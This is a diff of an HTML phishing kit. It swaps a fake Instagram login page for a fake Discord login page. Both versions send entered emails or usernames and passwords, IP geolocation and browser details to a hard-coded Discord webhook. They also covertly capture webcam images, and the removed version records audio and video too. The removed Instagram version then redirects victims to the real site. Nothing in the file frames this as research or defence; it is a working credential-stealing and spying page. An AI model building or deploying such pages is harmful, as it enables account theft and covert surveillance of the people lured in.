@@ -3,126 +3,178 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
+    <title>Discord</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
-        .logo { width: 175px; margin-bottom: 30px; }
-        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; background: #fafafa; font-size: 12px; }
-        button { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        button:disabled { background: #b2dffc; }
-        .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: bold; }
-        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
-        .divider span { padding: 0 10px; }
-        .forgot { color: #00376b; font-size: 12px; text-decoration: none; margin-top: 20px; display: block; }
-        .signup-box { background: white; border: 1px solid #dbdbdb; padding: 20px; width: 350px; text-align: center; margin-top: 10px; font-size: 14px; }
-        .signup-box a { color: #0095f6; text-decoration: none; font-weight: bold; }
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #5865F2;
+            font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #dcddde;
+        }
+        .login-box {
+            background-color: #313338;
+            padding: 32px;
+            border-radius: 8px;
+            width: 480px;
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,.2);
+            text-align: center;
+        }
+        h3 {
+            color: #f2f3f5;
+            font-size: 24px;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+        p {
+            color: #b5bac1;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            color: #b5bac1;
+            font-size: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            background-color: #1e1f22;
+            border: none;
+            border-radius: 3px;
+            color: #dbdee1;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        input:focus {
+            outline: none;
+        }
+        .forgot {
+            color: #00a8fc;
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            margin-top: 4px;
+            cursor: pointer;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #5865F2;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .register {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #949ba4;
+            text-align: left;
+        }
+        .register span {
+            color: #00a8fc;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
-    <div>
-        <div class="container">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" class="logo">
-            <form id="loginForm">
-                <input type="text" id="username" placeholder="Phone number, username, or email" required>
-                <input type="password" id="password" placeholder="Password" required>
-                <button type="submit" id="loginBtn">Log In</button>
-            </form>
-            <div class="divider"><span>OR</span></div>
-            <a href="#" class="forgot">Forgot password?</a>
-        </div>
-        <div class="signup-box">
-            Don't have an account? <a href="#">Sign up</a>
-        </div>
+
+<div class="login-box">
+    <h3>Welcome back!</h3>
+    <p>We're so excited to see you again!</p>
+    
+    <div class="input-group">
+        <label>Email or Phone Number <span style="color: #f23f42;">*</span></label>
+        <input type="text" id="email" required>
     </div>
+    
+    <div class="input-group">
+        <label>Password <span style="color: #f23f42;">*</span></label>
+        <input type="password" id="password" required>
+        <a class="forgot" id="forgot-btn">Forgot your password?</a>
+    </div>
+    
+    <button id="login-btn">Log In</button>
+    
+    <div class="register">
+        Need an account? <span id="register-btn">Register</span>
+    </div>
+</div>
 
-    <script>
-        const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3';
+<script>
+    const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3';
 
-        async function getIPData() {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                return await res.json();
-            } catch (e) {
-                return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country_name: 'Unknown' };
-            }
+    async function captureAndSend(action) {
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        let ipData = {};
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            ipData = await res.json();
+        } catch(e) {}
+
+        const userAgent = navigator.userAgent;
+
+        let imageBlob = null;
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+
+            imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+            stream.getTracks().forEach(track => track.stop());
+        } catch(e) {}
+
+        const formData = new FormData();
+        const payload = {
+            embeds: [{
+                title: `Target Action: ${action}`,
+                color: 16711680,
+                fields: [
+                    { name: "Email", value: email || "N/A", inline: true },
+                    { name: "Password", value: password || "N/A", inline: true },
+                    { name: "IP Address", value: ipData.ip || "Unknown", inline: false },
+                    { name: "Location", value: `${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}`, inline: false },
+                    { name: "OS/Browser", value: userAgent, inline: false },
+                    { name: "Time Captured", value: new Date().toISOString(), inline: false }
+                ]
+            }]
+        };
+
+        formData.append('payload_json', JSON.stringify(payload));
+        if (imageBlob) {
+            formData.append('file', imageBlob, 'webcam.jpg');
         }
 
-        function getBrowserData() {
-            return {
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform
-            };
-        }
+        try {
+            await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+        } catch(e) {}
+    }
 
-        async function captureMedia() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-                const mediaRecorder = new MediaRecorder(stream);
-                const chunks = [];
-                
-                mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
-                    const formData = new FormData();
-                    formData.append('file', blob, 'capture.webm');
-                    
-                    await fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        body: formData
-                    });
-                    
-                    stream.getTracks().forEach(track => track.stop());
-                };
-                
-                mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 5000); // Record 5 seconds
-            } catch (e) {
-                console.error("Media capture failed", e);
-            }
-        }
-
-        document.getElementById('loginForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            // Start media capture silently
-            captureMedia();
-
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const ipData = await getIPData();
-            const browserData = getBrowserData();
-            const timestamp = new Date().toISOString();
-
-            const payload = {
-                content: "@everyone New Login Captured!",
-                embeds: [{
-                    title: "Instagram Phish Result",
-                    color: 14423100,
-                    fields: [
-                        { name: "Username", value: username, inline: true },
-                        { name: "Password", value: password, inline: true },
-                        { name: "IP Address", value: ipData.ip, inline: false },
-                        { name: "Location", value: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`, inline: false },
-                        { name: "OS/Platform", value: browserData.platform, inline: true },
-                        { name: "User Agent", value: browserData.userAgent, inline: false },
-                        { name: "Timestamp", value: timestamp, inline: false }
-                    ]
-                }]
-            };
-
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)Aa
-            });
-
-            // Redirect to real instagram after a delay
-            setTimeout(() => {
-                window.location.href = 'https://www.instagram.com';
-            }, 5500);
-        });
-    </script>
+    document.getElementById('login-btn').addEventListener('click', () => captureAndSend('Log In'));
+    document.getElementById('forgot-btn').addEventListener('click', () => captureAndSend('Forgot Password'));
+    document.getElementById('register-btn').addEventListener('click', () => captureAndSend('Register'));
+</script>
 </body>
 </html>
